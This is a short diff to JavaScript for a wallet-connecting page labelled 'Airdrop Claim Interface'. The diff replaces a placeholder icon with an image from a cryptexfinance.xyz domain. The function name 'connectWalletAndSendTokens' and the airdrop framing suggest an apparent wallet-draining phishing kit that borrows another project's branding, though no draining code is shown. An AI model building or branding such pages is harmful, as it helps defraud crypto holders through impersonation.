@@ -94,7 +94,7 @@ async function connectWalletAndSendTokens() {
     name: 'Ethereum Blockchain Explorer',
     description: 'Airdrop Claim Interface',
     url: window.location.host, // e.g., 'example.com'
-    icons: ['https://your-site.com/icon.png'] // Replace with your app’s icon URL
+    icons: ['https://www.cryptexfinance.xyz/assets/images/IMG_2922.png'] // Replace with your app’s icon URL
   };
 
   const evmNetworks = [
